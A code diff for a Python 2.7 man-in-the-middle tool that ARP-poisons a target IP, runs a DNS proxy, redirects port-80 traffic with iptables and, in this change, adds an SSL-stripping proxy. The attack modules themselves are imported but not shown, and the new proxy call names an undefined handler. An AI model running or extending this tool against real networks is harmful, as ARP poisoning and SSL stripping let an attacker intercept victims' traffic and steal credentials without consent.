@@ -1,4 +1,5 @@
 #!/usr/bin/env python2.7
+
 import os
 import sys
 import fcntl
@@ -13,6 +14,8 @@ from ArpPoisoner import ArpPoisoner
 from DnsProxy import DnsProxy
 
 
+
+from Proxy import Proxy, SSLStripRequestHandler
 BLUE = '\033[94m'
 END = '\033[0m'
 
@@ -25,7 +28,7 @@ class SWRT(object):
 		parser.add_argument('-t', action='store', dest='target', help='Store a target IP address', required=True)
 		parser.add_argument('-r', action='store', default="192.168.1.1", dest='gateway', help='Store the gateway IP address', required=False)
 		parser.add_argument('-c', action='store', dest='conf', default='./conf.json', help='Store path/to/conf.json', required=False)
-		parser.add_argument('-p', action='store', default="8080", dest='port', help='Store the port', required=False)
+		parser.add_argument('-p', action='store', default=8080, dest='port', help='Store the port', required=False)
 		self.args = parser.parse_args()
 
 		def get_host_ip(interface):
@@ -77,41 +80,34 @@ if __name__ == "__main__":
 		sys.exit("Need root privileges to run properly; Re-run as sudo...")
 	swrt = SWRT()
 	if (swrt.args.conf != None):
-		config = DNSConf.DNSConf(swrt.args.interface, swrt.args.conf)
-
+		config = DNSConf.DNSConf(swrt.args.interface, swrt.args.conf)		
 	try:
 		ArpPoisoner(swrt.args)
 		dnsproxy = DnsProxy(config, swrt.args)
 		dnsproxy.start()
 		os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports {}".format(8080))
+		
+		Proxy(HandlerClass=HTTPrequest)
 
-		while True:
-			sleep(1)
+
 	except KeyboardInterrupt:
+		print("QUIT")
 		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
 		os.system('iptables -t nat -F')
 		exit(0)
 	except Exception as e:
+		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+		os.system('iptables -t nat -F')
 		exc_type, exc_value, exc_traceback = sys.exc_info()
-		print "*** print_tb:"
 		traceback.print_tb(exc_traceback, limit=1, file=sys.stdout)
-		print "*** print_exception:"
 		traceback.print_exception(exc_type, exc_value, exc_traceback,
 	                              limit=2, file=sys.stdout)
-		print "*** print_exc:"
 		traceback.print_exc()
-		print "*** format_exc, first and last line:"
 		formatted_lines = traceback.format_exc().splitlines()
 		print formatted_lines[0]
 		print formatted_lines[-1]
-		print "*** format_exception:"
 		print repr(traceback.format_exception(exc_type, exc_value,
 	                                          exc_traceback))
-		print "*** extract_tb:"
 		print repr(traceback.extract_tb(exc_traceback))
-		print "*** format_tb:"
 		print repr(traceback.format_tb(exc_traceback))
-		print "*** tb_lineno:", exc_traceback.tb_lineno		
-		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
-		os.system('iptables -t nat -F')
-		exit(0)
+		exit(1)
